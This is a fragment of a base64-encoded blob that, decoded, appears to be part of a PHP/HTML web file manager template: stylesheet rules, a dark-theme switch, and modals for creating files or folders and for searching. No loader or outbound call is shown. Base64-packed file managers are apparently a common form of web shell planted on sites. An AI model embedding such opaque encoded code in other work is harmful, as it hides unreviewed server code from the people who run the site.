IHsgYm9yZGVyLWNvbG9yOmdyZWVuO2NvbG9yOmdyZWVuICB9DQogICAgICAgIC5tZXNzYWdlLmVycm9yIHsgYm9yZGVyLWNvbG9yOnJlZDtjb2xvcjpyZWQgIH0NCiAgICAgICAgLm1lc3NhZ2UuYWxlcnQgeyBib3JkZXItY29sb3I6b3JhbmdlO2NvbG9yOm9yYW5nZSAgfQ0KICAgICAgICAucHJldmlldy1pbWcgeyBtYXgtd2lkdGg6MTAwJTttYXgtaGVpZ2h0Ojgwdmg7YmFja2dyb3VuZDp1cmwoZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCQUFBQUFRQ0FJQUFBQ1FrV2cyQUFBQUtrbEVRVlI0Mm1MNS8vOC9BemJ3K1BGanJPSk1EQ1NDVVEzRUFCWmM0UzByS3pzYVN2VFRBQkJnQU15ZkNNc1k0QjlpQUFBQUFFbEZUa1N1UW1DQyk7Y3Vyc29yOnpvb20taW4gfQ0KICAgICAgICBpbnB1dCNwcmV2aWV3LWltZy16b29tQ2hlY2tbdHlwZT1jaGVja2JveF0geyBkaXNwbGF5Om5vbmUgfQ0KICAgICAgICBpbnB1dCNwcmV2aWV3LWltZy16b29tQ2hlY2tbdHlwZT1jaGVja2JveF06Y2hlY2tlZCB+IGxhYmVsID4gaW1nIHsgbWF4LXdpZHRoOm5vbmU7bWF4LWhlaWdodDpub25lO2N1cnNvcjp6b29tLW91dCB9DQogICAgICAgIC5pbmxpbmUtYWN0aW9ucyA+IGEgPiBpIHsgZm9udC1zaXplOjFlbTttYXJnaW4tbGVmdDo1cHg7YmFja2dyb3VuZDojMzc4NWMxO2NvbG9yOiNmZmY7cGFkZGluZzozcHggNHB4O2JvcmRlci1yYWRpdXM6M3B4OyB9DQogICAgICAgIC5wcmV2aWV3LXZpZGVvIHsgcG9zaXRpb246cmVsYXRpdmU7bWF4LXdpZHRoOjEwMCU7aGVpZ2h0OjA7cGFkZGluZy1ib3R0b206NjIuNSU7bWFyZ2luLWJvdHRvbToxMHB4ICB9DQogICAgICAgIC5wcmV2aWV3LXZpZGVvIHZpZGVvIHsgcG9zaXRpb246YWJzb2x1dGU7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtsZWZ0OjA7dG9wOjA7YmFja2dyb3VuZDojMDAwICB9DQogICAgICAgIC5jb21wYWN0LXRhYmxlIHsgYm9yZGVyOjA7d2lkdGg6YXV0byAgfQ0KICAgICAgICAuY29tcGFjdC10YWJsZSB0ZCwgLmNvbXBhY3QtdGFibGUgdGggeyB3aWR0aDoxMDBweDtib3JkZXI6MDt0ZXh0LWFsaWduOmNlbnRlciAgfQ0KICAgICAgICAuY29tcGFjdC10YWJsZSB0cjpob3ZlciB0ZCB7IGJhY2tncm91bmQtY29sb3I6I2ZmZiAgfQ0KICAgICAgICAuZmlsZW5hbWUgeyBtYXgtd2lkdGg6NDIwcHg7b3ZlcmZsb3c6aGlkZGVuO3RleHQtb3ZlcmZsb3c6ZWxsaXBzaXMgIH0NCiAgICAgICAgLmJyZWFrLXdvcmQgeyB3b3JkLXdyYXA6YnJlYWstd29yZDttYXJnaW4tbGVmdDozMHB4ICB9DQogICAgICAgIC5icmVhay13b3JkLmZsb2F0LWxlZnQgYSB7IGNvbG9yOiM3ZDdkN2QgIH0NCiAgICAgICAgLmJyZWFrLXdvcmQgKyAuZmxvYXQtcmlnaHQgeyBwYWRkaW5nLXJpZ2h0OjMwcHg7cG9zaXRpb246cmVsYXRpdmUgIH0NCiAgICAgICAgLmJyZWFrLXdvcmQgKyAuZmxvYXQtcmlnaHQgPiBhIHsgY29sb3I6IzdkN2Q3ZDtmb250LXNpemU6MS4yZW07bWFyZ2luLXJpZ2h0OjRweCAgfQ0KICAgICAgICAjZWRpdG9yIHsgcG9zaXRpb246YWJzb2x1dGU7cmlnaHQ6MTVweDt0b3A6MTAwcHg7Ym90dG9tOjE1cHg7bGVmdDoxNXB4ICB9DQogICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOjQ4MXB4KSB7DQogICAgICAgICAgICAjZWRpdG9yIHsgdG9wOjE1MHB4OyB9DQogICAgICAgIH0NCiAgICAgICAgI25vcm1hbC1lZGl0b3IgeyBib3JkZXItcmFkaXVzOjNweDtib3JkZXItd2lkdGg6MnB4O3BhZGRpbmc6MTBweDtvdXRsaW5lOm5vbmU7IH0NCiAgICAgICAgLmJ0bi0yIHsgcGFkZGluZzo0cHggMTBweDtmb250LXNpemU6c21hbGw7IH0NCiAgICAgICAgbGkuZmlsZTpiZWZvcmUsbGkuZm9sZGVyOmJlZm9yZSB7IGZvbnQ6bm9ybWFsIG5vcm1hbCBub3JtYWwgMTRweC8xIEZvbnRBd2Vzb21lO2NvbnRlbnQ6IlxmMDE2IjttYXJnaW4tcmlnaHQ6NXB4IH0NCiAgICAgICAgbGkuZm9sZGVyOmJlZm9yZSB7IGNvbnRlbnQ6IlxmMTE0IiB9DQogICAgICAgIGkuZmEuZmEtZm9sZGVyLW8geyBjb2xvcjojMDE1N2IzIH0NCiAgICAgICAgaS5mYS5mYS1waWN0dXJlLW8geyBjb2xvcjojMjZiOTlhIH0NCiAgICAgICAgaS5mYS5mYS1maWxlLWFyY2hpdmUtbyB7IGNvbG9yOiNkYTdkN2QgfQ0KICAgICAgICAuYnRuLTIgaS5mYS5mYS1maWxlLWFyY2hpdmUtbyB7IGNvbG9yOmluaGVyaXQgfQ0KICAgICAgICBpLmZhLmZhLWNzczMgeyBjb2xvcjojZjM2ZmEwIH0NCiAgICAgICAgaS5mYS5mYS1maWxlLWNvZGUtbyB7IGNvbG9yOiMwMDdiZmYgfQ0KICAgICAgICBpLmZhLmZhLWNvZGUgeyBjb2xvcjojY2M0YjRjIH0NCiAgICAgICAgaS5mYS5mYS1maWxlLXRleHQtbyB7IGNvbG9yOiMwMDk2ZTYgfQ0KICAgICAgICBpLmZhLmZhLWh0bWw1IHsgY29sb3I6I2Q3NWU3MiB9DQogICAgICAgIGkuZmEuZmEtZmlsZS1leGNlbC1vIHsgY29sb3I6IzA5YzU1ZCB9DQogICAgICAgIGkuZmEuZmEtZmlsZS1wb3dlcnBvaW50LW8geyBjb2xvcjojZjY3MTJlIH0NCiAgICAgICAgaS5nby1iYWNrIHsgZm9udC1zaXplOjEuMmVtO2NvbG9yOiMwMDdiZmY7IH0NCiAgICAgICAgLm1haW4tbmF2IHsgcGFkZGluZzowLjJyZW0gMXJlbTtib3gtc2hhZG93OjAgNHB4IDVweCAwIHJnYmEoMCwgMCwgMCwgLjE0KSwgMCAxcHggMTBweCAwIHJnYmEoMCwgMCwgMCwgLjEyKSwgMCAycHggNHB4IC0xcHggcmdiYSgwLCAwLCAwLCAuMikgIH0NCiAgICAgICAgLmRhdGFUYWJsZXNfZmlsdGVyIHsgZGlzcGxheTpub25lOyB9DQogICAgICAgIHRhYmxlLmRhdGFUYWJsZSB0aGVhZCAuc29ydGluZyB7IGN1cnNvcjpwb2ludGVyO2JhY2tncm91bmQtcmVwZWF0Om5vLXJlcGVhdDtiYWNrZ3JvdW5kLXBvc2l0aW9uOmNlbnRlciByaWdodDtiYWNrZ3JvdW5kLWltYWdlOnVybCgnZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFCTUFBQUFUQ0FRQUFBRFlXZjVIQUFBQWtFbEVRVlFvejdYUU1RNUFRQkNGNGRXUVNKeEM1d3dheDFDcTFlN0JBZHhENVNMK1RxL1FDTTFvTmlKaWR3b3gwMzU1bVhuRy9EckV0SVE2YXppb05aUXhJMHlrUGhUUUl3aENSK0JtQll0bEs3a0xKWXdXQ2NKQTlNNHFkclpyZDhwUGpaV1B0T3FkUlF5MzIwWVNWMTdPYXRGQzRldXRzNnozOUdZTUtSUENUS1k5VW5QUTZQK0d0TVJmR3RQbkJDaXFoQWVKUG1rcUFBQUFBRWxGVGtTdVFtQ0MnKTsgfQ0KICAgICAgICB0YWJsZS5kYXRhVGFibGUgdGhlYWQgLnNvcnRpbmdfYXNjIHsgY3Vyc29yOnBvaW50ZXI7YmFja2dyb3VuZC1yZXBlYXQ6bm8tcmVwZWF0O2JhY2tncm91bmQtcG9zaXRpb246Y2VudGVyIHJpZ2h0O2JhY2tncm91bmQtaW1hZ2U6dXJsKCdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUJNQUFBQVRDQVlBQUFCeVVEYk1BQUFBWjBsRVFWUTR5Mk5nR0xLZ3F1RXVGeEJQQUdJMmFoaFdDc1MvZ0RpYlVvTzBnUGd4RVA4SDR0dEFyRXl1UVl4QVBCZHFFQXhQQkltVFk1Z2pFTDlETSt3VEVOdVFhaEF2RU85RE13aUdkd0F4T3ltR0pRTHhUeUQramdXRHhDTVpSc0VvR0FWb0FBRGVlbXd0UGNaSTJ3QUFBQUJKUlU1RXJrSmdnZz09Jyk7IH0NCiAgICAgICAgdGFibGUuZGF0YVRhYmxlIHRoZWFkIC5zb3J0aW5nX2Rlc2MgeyBjdXJzb3I6cG9pbnRlcjtiYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQ7YmFja2dyb3VuZC1wb3NpdGlvbjpjZW50ZXIgcmlnaHQ7YmFja2dyb3VuZC1pbWFnZTp1cmwoJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQk1BQUFBVENBWUFBQUJ5VURiTUFBQUFaVWxFUVZRNHkyTmdHQVdqWUJTZ2dhcUd1NUZBL0JPSXYyUEJJUEZFVWd4akIrSWRRUHdmQzk0SHhMeWt1czRHaUQraEdmUU9pQjNKOFNvakVFOUVNMnd1U0p6Y3NGTUc0dHRRZ3g0RHNSYWxrWkVOeEwrQXVKUWFNY3NHeEJPQW1Hdm9wazhBVnoxc0xaZ2cwYnNBQUFBQVNVVk9SSzVDWUlJPScpOyB9DQogICAgICAgIHRhYmxlLmRhdGFUYWJsZSB0aGVhZCB0cjpmaXJzdC1jaGlsZCB0aC5jdXN0b20tY2hlY2tib3gtaGVhZGVyOmZpcnN0LWNoaWxkIHsgYmFja2dyb3VuZC1pbWFnZTpub25lOyB9DQogICAgICAgIC5mb290ZXItYWN0aW9uIGxpIHsgbWFyZ2luLWJvdHRvbToxMHB4OyB9DQogICAgICAgIC5hcHAtdi10aXRsZSB7IGZvbnQtc2l6ZToyNHB4O2ZvbnQtd2VpZ2h0OjMwMDtsZXR0ZXItc3BhY2luZzotLjVweDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IH0NCiAgICAgICAgaHIuY3VzdG9tLWhyIHsgYm9yZGVyLXRvcDoxcHggZGFzaGVkICM4YzhiOGI7Ym9yZGVyLWJvdHRvbToxcHggZGFzaGVkICNmZmY7IH0NCiAgICAgICAgI3NuYWNrYmFyIHsgdmlzaWJpbGl0eTpoaWRkZW47bWluLXdpZHRoOjI1MHB4O21hcmdpbi1sZWZ0Oi0xMjVweDtiYWNrZ3JvdW5kLWNvbG9yOiMzMzM7Y29sb3I6I2ZmZjt0ZXh0LWFsaWduOmNlbnRlcjtib3JkZXItcmFkaXVzOjJweDtwYWRkaW5nOjE2cHg7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDoxO2xlZnQ6NTAlO2JvdHRvbTozMHB4O2ZvbnQtc2l6ZToxN3B4OyB9DQogICAgICAgICNzbmFja2Jhci5zaG93IHsgdmlzaWJpbGl0eTp2aXNpYmxlOy13ZWJraXQtYW5pbWF0aW9uOmZhZGVpbiAwLjVzLCBmYWRlb3V0IDAuNXMgMi41czthbmltYXRpb246ZmFkZWluIDAuNXMsIGZhZGVvdXQgMC41cyAyLjVzOyB9DQogICAgICAgIEAtd2Via2l0LWtleWZyYW1lcyBmYWRlaW4geyBmcm9tIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9DQogICAgICAgIHRvIHsgYm90dG9tOjMwcHg7b3BhY2l0eToxOyB9DQogICAgICAgIH0NCiAgICAgICAgQGtleWZyYW1lcyBmYWRlaW4geyBmcm9tIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9DQogICAgICAgIHRvIHsgYm90dG9tOjMwcHg7b3BhY2l0eToxOyB9DQogICAgICAgIH0NCiAgICAgICAgQC13ZWJraXQta2V5ZnJhbWVzIGZhZGVvdXQgeyBmcm9tIHsgYm90dG9tOjMwcHg7b3BhY2l0eToxOyB9DQogICAgICAgIHRvIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9DQogICAgICAgIH0NCiAgICAgICAgQGtleWZyYW1lcyBmYWRlb3V0IHsgZnJvbSB7IGJvdHRvbTozMHB4O29wYWNpdHk6MTsgfQ0KICAgICAgICB0byB7IGJvdHRvbTowO29wYWNpdHk6MDsgfQ0KICAgICAgICB9DQogICAgICAgICNtYWluLXRhYmxlIHNwYW4uYmFkZ2UgeyBib3JkZXItYm90dG9tOjJweCBzb2xpZCAjZjhmOWZhIH0NCiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoMSkgeyBib3JkZXItY29sb3I6I2RmNDIyNyB9DQogICAgICAgICNtYWluLXRhYmxlIHNwYW4uYmFkZ2U6bnRoLWNoaWxkKDIpIHsgYm9yZGVyLWNvbG9yOiNmOGI2MDAgfQ0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCgzKSB7IGJvcmRlci1jb2xvcjojMDBiZDYwIH0NCiAgICAgICAgI21haW4tdGFibGUgc3Bhbi5iYWRnZTpudGgtY2hpbGQoNCkgeyBib3JkZXItY29sb3I6IzQ1ODFmZiB9DQogICAgICAgICNtYWluLXRhYmxlIHNwYW4uYmFkZ2U6bnRoLWNoaWxkKDUpIHsgYm9yZGVyLWNvbG9yOiNhYzY4ZmMgfQ0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCg2KSB7IGJvcmRlci1jb2xvcjojNDVjM2QyIH0NCiAgICAgICAgQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAobWluLWRldmljZS13aWR0aDo3NjhweCkgYW5kIChtYXgtZGV2aWNlLXdpZHRoOjEwMjRweCkgYW5kIChvcmllbnRhdGlvbjpsYW5kc2NhcGUpIGFuZCAoLXdlYmtpdC1taW4tZGV2aWNlLXBpeGVsLXJhdGlvOjIpIHsgLm5hdmJhci1jb2xsYXBzZSAuY29sLXhzLTYgeyBwYWRkaW5nOjA7IH0NCiAgICAgICAgfQ0KICAgICAgICAuYnRuLmFjdGl2ZS5mb2N1cywuYnRuLmFjdGl2ZTpmb2N1cywuYnRuLmZvY3VzLC5idG4uZm9jdXM6YWN0aXZlLC5idG46YWN0aXZlOmZvY3VzLC5idG46Zm9jdXMgeyBvdXRsaW5lOjAhaW1wb3J0YW50O291dGxpbmUtb2Zmc2V0OjAhaW1wb3J0YW50O2JhY2tncm91bmQtaW1hZ2U6bm9uZSFpbXBvcnRhbnQ7LXdlYmtpdC1ib3gtc2hhZG93Om5vbmUhaW1wb3J0YW50O2JveC1zaGFkb3c6bm9uZSFpbXBvcnRhbnQgfQ0KICAgICAgICAubGRzLWZhY2Vib29rIHsgZGlzcGxheTpub25lO3Bvc2l0aW9uOnJlbGF0aXZlO3dpZHRoOjY0cHg7aGVpZ2h0OjY0cHggfQ0KICAgICAgICAubGRzLWZhY2Vib29rIGRpdiwubGRzLWZhY2Vib29rLnNob3ctbWUgeyBkaXNwbGF5OmlubGluZS1ibG9jayB9DQogICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2IHsgcG9zaXRpb246YWJzb2x1dGU7bGVmdDo2cHg7d2lkdGg6MTNweDtiYWNrZ3JvdW5kOiMwMDdiZmY7YW5pbWF0aW9uOmxkcy1mYWNlYm9vayAxLjJzIGN1YmljLWJlemllcigwLC41LC41LDEpIGluZmluaXRlIH0NCiAgICAgICAgLmxkcy1mYWNlYm9vayBkaXY6bnRoLWNoaWxkKDEpIHsgbGVmdDo2cHg7YW5pbWF0aW9uLWRlbGF5Oi0uMjRzIH0NCiAgICAgICAgLmxkcy1mYWNlYm9vayBkaXY6bnRoLWNoaWxkKDIpIHsgbGVmdDoyNnB4O2FuaW1hdGlvbi1kZWxheTotLjEycyB9DQogICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2Om50aC1jaGlsZCgzKSB7IGxlZnQ6NDVweDthbmltYXRpb24tZGVsYXk6MHMgfQ0KICAgICAgICBAa2V5ZnJhbWVzIGxkcy1mYWNlYm9vayB7IDAlIHsgdG9wOjZweDtoZWlnaHQ6NTFweCB9DQogICAgICAgIDEwMCUsNTAlIHsgdG9wOjE5cHg7aGVpZ2h0OjI2cHggfQ0KICAgICAgICB9DQogICAgICAgIHVsI3NlYXJjaC13cmFwcGVyIHsgcGFkZGluZy1sZWZ0OiAwO2JvcmRlcjogMXB4IHNvbGlkICNlY2VjZWNjYzsgfSB1bCNzZWFyY2gtd3JhcHBlciBsaSB7IGxpc3Qtc3R5bGU6IG5vbmU7IHBhZGRpbmc6IDVweDtib3JkZXItYm90dG9tOiAxcHggc29saWQgI2VjZWNlY2NjOyB9DQogICAgICAgIHVsI3NlYXJjaC13cmFwcGVyIGxpOm50aC1jaGlsZChvZGQpeyBiYWNrZ3JvdW5kOiAjZjlmOWY5Y2M7fQ0KICAgICAgICAuYy1wcmV2aWV3LWltZyB7IG1heC13aWR0aDogMzAwcHg7IH0NCiAgICAgICAgLmJvcmRlci1yYWRpdXMtMCB7IGJvcmRlci1yYWRpdXM6IDA7IH0NCiAgICAgICAgLmZsb2F0LXJpZ2h0IHsgZmxvYXQ6IHJpZ2h0OyB9DQogICAgICAgIC50YWJsZS1ob3Zlcj50Ym9keT50cjpob3Zlcj50ZDpmaXJzdC1jaGlsZCB7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgIzFiNzdmZDsgfQ0KICAgICAgICAjbWFpbi10YWJsZSB0ci5ldmVuIHsgYmFja2dyb3VuZC1jb2xvcjogI0Y4RjlGYTsgfQ0KICAgICAgICAuZmlsZW5hbWU+YT5pIHttYXJnaW4tcmlnaHQ6IDNweDt9DQogICAgPC9zdHlsZT4NCiAgICA8P3BocA0KICAgIGlmIChGTV9USEVNRSA9PSAiZGFyayIpOiA/Pg0KICAgICAgICA8c3R5bGU+DQogICAgICAgICAgICA6cm9vdCB7DQogICAgICAgICAgICAgICAgLS1icy1iZy1vcGFjaXR5OiAxOw0KICAgICAgICAgICAgICAgIC0tYmctY29sb3I6ICNmM2RhYTY7DQogICAgICAgICAgICAgICAgLS1icy1kYXJrLXJnYjogMjgsIDM2LCA0MSAhaW1wb3J0YW50Ow0KICAgICAgICAgICAgICAgIC0tYnMtYmctb3BhY2l0eTogMTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC50YWJsZS1kYXJrIHsgLS1icy10YWJsZS1iZzogMjgsIDM2LCA0MSAhaW1wb3J0YW50OyB9DQogICAgICAgICAgICAuYnRuLXByaW1hcnkgeyAtLWJzLWJ0bi1iZzogIzI2NTY2YzsgLS1icy1idG4tYm9yZGVyLWNvbG9yOiAjMjY1NjZjOyB9DQogICAgICAgICAgICBib2R5LnRoZW1lLWRhcmsgeyBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsICMxYzI0MjksICMyNjMyMzgpOyBjb2xvcjogI0NGRDhEQzsgfQ0KICAgICAgICAgICAgLmxpc3QtZ3JvdXAgLmxpc3QtZ3JvdXAtaXRlbSB7IGJhY2tncm91bmQ6ICMzNDNhNDA7IH0NCiAgICAgICAgICAgIC50aGVtZS1kYXJrIC5uYXZiYXItbmF2IGksIC5uYXZiYXItbmF2IC5kcm9wZG93bi10b2dnbGUsIC5icmVhay13b3JkIHsgY29sb3I6ICNDRkQ4REM7IH0NCiAgICAgICAgICAgIGEsIGE6aG92ZXIsIGE6dmlzaXRlZCwgYTphY3RpdmUsICNtYWluLXRhYmxlIC5maWxlbmFtZSBhLCBpLmZhLmZhLWZvbGRlci1vLCBpLmdvLWJhY2sgeyBjb2xvcjogdmFyKC0tYmctY29sb3IpOyB9DQogICAgICAgICAgICB1bCNzZWFyY2gtd3JhcHBlciBsaTpudGgtY2hpbGQob2RkKSB7IGJhY2tncm91bmQ6ICMyMTJhMmY7IH0NCiAgICAgICAgICAgIC50aGVtZS1kYXJrIC5idG4tb3V0bGluZS1wcmltYXJ5IHsgY29sb3I6ICNiOGU1OWM7IGJvcmRlci1jb2xvcjogI2I4ZTU5YzsgfQ0KICAgICAgICAgICAgLnRoZW1lLWRhcmsgLmJ0bi1vdXRsaW5lLXByaW1hcnk6aG92ZXIsIC50aGVtZS1kYXJrIC5idG4tb3V0bGluZS1wcmltYXJ5OmFjdGl2ZSB7IGJhY2tncm91bmQtY29sb3I6ICMyZDQxMjE7fQ0KICAgICAgICAgICAgLnRoZW1lLWRhcmsgaW5wdXQuZm9ybS1jb250cm9sIHsgYmFja2dyb3VuZC1jb2xvcjogIzEwMTUxODsgY29sb3I6ICNDRkQ4REM7IH0NCiAgICAgICAgICAgIC50aGVtZS1kYXJrIC5kcm9wem9uZSB7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyB9DQogICAgICAgICAgICAudGhlbWUtZGFyayAuaW5saW5lLWFjdGlvbnMgPiBhID4gaSB7IGJhY2tncm91bmQ6ICM3OTc1NWU7IH0NCiAgICAgICAgICAgIC50aGVtZS1kYXJrIC50ZXh0LXdoaXRlIHsgY29sb3I6ICNDRkQ4REMgIWltcG9ydGFudDsgfQ0KICAgICAgICAgICAgLnRoZW1lLWRhcmsgLnRhYmxlLWJvcmRlcmVkIHRkLCAudGFibGUtYm9yZGVyZWQgdGggeyBib3JkZXItY29sb3I6ICMzNDM0MzQ7IH0NCiAgICAgICAgICAgIC50aGVtZS1kYXJrIC50YWJsZS1ib3JkZXJlZCB0ZCAuY3VzdG9tLWNvbnRyb2wtaW5wdXQsIC50aGVtZS1kYXJrIC50YWJsZS1ib3JkZXJlZCB0aCAuY3VzdG9tLWNvbnRyb2wtaW5wdXQgeyBvcGFjaXR5OiAwLjY3ODsgfQ0KICAgICAgICAgICAgLm1lc3NhZ2UgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjEyNTI5OyB9DQogICAgICAgICAgICAuY29tcGFjdC10YWJsZSB0cjpob3ZlciB0ZCB7IGJhY2tncm91bmQtY29sb3I6ICMzZDNkM2Q7IH0NCiAgICAgICAgICAgICNtYWluLXRhYmxlIHRyLmV2ZW4geyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjEyOTJmOyB9DQogICAgICAgICAgICBmb3JtLmRyb3B6b25lIHsgYm9yZGVyLWNvbG9yOiAjNzk3NTVlOyB9DQogICAgICAgIDwvc3R5bGU+DQogICAgPD9waHAgZW5kaWY7ID8+DQo8L2hlYWQ+DQo8Ym9keSBjbGFzcz0iPD9waHAgZWNobyAoRk1fVEhFTUUgPT0gImRhcmsiKSA/ICd0aGVtZS1kYXJrJyA6ICcnOyA/PiA8P3BocCBlY2hvICRpc1N0aWNreU5hdkJhcjsgPz4iPg0KPGRpdiBpZD0id3JhcHBlciIgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQogICAgPCEtLSBOZXcgSXRlbSBjcmVhdGlvbiAtLT4NCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0iY3JlYXRlTmV3SXRlbSIgdGFiaW5kZXg9Ii0xIiByb2xlPSJkaWFsb2ciIGRhdGEtYnMtYmFja2Ryb3A9InN0YXRpYyIgZGF0YS1icy1rZXlib2FyZD0iZmFsc2UiIGFyaWEtbGFiZWxsZWRieT0ibmV3SXRlbU1vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIiByb2xlPSJkb2N1bWVudCI+DQogICAgICAgICAgICA8Zm9ybSBjbGFzcz0ibW9kYWwtY29udGVudCA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiIgbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIiBpZD0ibmV3SXRlbU1vZGFsTGFiZWwiPjxpIGNsYXNzPSJmYSBmYS1wbHVzLXNxdWFyZSBmYS1mdyI+PC9pPjw/cGhwIGVjaG8gbG5nKCdDcmVhdGVOZXdJdGVtJykgPz48L2g1Pg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0bi1jbG9zZSIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPg0KICAgICAgICAgICAgICAgICAgICA8cD48bGFiZWwgZm9yPSJuZXdmaWxlIj48P3BocCBlY2hvIGxuZygnSXRlbVR5cGUnKSA/PiA8L2xhYmVsPjwvcD4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1jaGVjayBmb3JtLWNoZWNrLWlubGluZSI+DQogICAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNoZWNrLWlucHV0IiB0eXBlPSJyYWRpbyIgbmFtZT0ibmV3ZmlsZSIgaWQ9ImN1c3RvbVJhZGlvSW5saW5lMSIgbmFtZT0ibmV3ZmlsZSIgdmFsdWU9ImZpbGUiPg0KICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZm9ybS1jaGVjay1sYWJlbCIgZm9yPSJjdXN0b21SYWRpb0lubGluZTEiPjw/cGhwIGVjaG8gbG5nKCdGaWxlJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1jaGVjayBmb3JtLWNoZWNrLWlubGluZSI+DQogICAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNoZWNrLWlucHV0IiB0eXBlPSJyYWRpbyIgbmFtZT0ibmV3ZmlsZSIgaWQ9ImN1c3RvbVJhZGlvSW5saW5lMiIgdmFsdWU9ImZvbGRlciIgY2hlY2tlZD4NCiAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImZvcm0tY2hlY2stbGFiZWwiIGZvcj0iY3VzdG9tUmFkaW9JbmxpbmUyIj48P3BocCBlY2hvIGxuZygnRm9sZGVyJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibXQtMyI+PGxhYmVsIGZvcj0ibmV3ZmlsZW5hbWUiPjw/cGhwIGVjaG8gbG5nKCdJdGVtTmFtZScpID8+IDwvbGFiZWw+PC9wPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmV3ZmlsZW5hbWUiIGlkPSJuZXdmaWxlbmFtZSIgdmFsdWU9IiIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9Ijw/cGhwIGVjaG8gbG5nKCdFbnRlciBoZXJlLi4uJykgPz4iIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciI+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtcHJpbWFyeSIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJykgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NyZWF0ZU5vdycpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KDQogICAgPCEtLSBBZHZhbmNlIFNlYXJjaCBNb2RhbCAtLT4NCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0ic2VhcmNoTW9kYWwiIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsbGVkYnk9InNlYXJjaE1vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyBtb2RhbC1sZyIgcm9sZT0iZG9jdW1lbnQiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb25